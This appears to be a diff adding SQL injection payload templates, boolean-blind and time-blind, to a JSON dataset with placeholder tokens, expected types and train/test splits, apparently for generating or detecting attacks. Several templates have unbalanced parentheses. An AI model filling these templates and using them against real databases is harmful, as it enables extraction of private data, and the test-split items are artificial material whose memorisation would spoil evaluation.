+        "technique": "boolean_blind",
+        "payload": "' AND CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$ THEN 1 ELSE 0 END = 1",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "boolean_blind",
+        "payload": "' AND IF((SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$,1,0) = 1",
+        "expected_types": [
+            "all",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) = $sample_t1_1$",
+        "expected_types": [
+            "integer",
+            "all",
+            "table",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT COUNT($column_t1_1$) FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$)>$int$",
+        "expected_types": [
+            "integer",
+            "all",
+            "table",
+            "all",
+            "all",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT SLEEP($int$) WHERE (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) LIKE $character$",
+        "expected_types": [
+            "integer",
+            "string",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "character"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND IF((SELECT SUBSTRING(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,$int$,1)) = $character$,SLEEP($int$),0)",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all",
+            "integer",
+            "character",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "train"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND CASE WHEN (SELECT TB.$column_t2_1$ FROM $table_1$ AS TA INNER JOIN $table_2$ AS TB ON TB.$column_t2_2$ = TA.$column_t1_1$ WHERE TA.$column_t1_2$ = $sample_t1_2$) = $sample$ THEN SLEEP(5) ELSE 0 END",
+        "expected_types": [
+            "all",
+            "table",
+            "table",
+            "number",
+            "number",
+            "all",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND CASE WHEN (SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$) REGEXP '[a-z]' THEN SLEEP(5) ELSE 0 END",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT BENCHMARK(1000000,MD5(1)) WHERE SUBSTR(SELECT $column_t1_1$ FROM $table_1$ WHERE $column_t1_2$ = $sample_t1_2$,1,1) IN ('a','e','i','o','u')",
+        "expected_types": [
+            "string",
+            "table",
+            "all",
+            "all"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    },
+    {
+        "technique": "time_blind",
+        "payload": "' AND (SELECT COUNT(*) FROM $table_1$,$table_2$,$table_3$)>$int$",
+        "expected_types": [
+            "table",
+            "table",
+            "table",
+            "integer"
+        ],
+        "reference_scope": "tsr",
+        "set": "test"
+    }
 ]
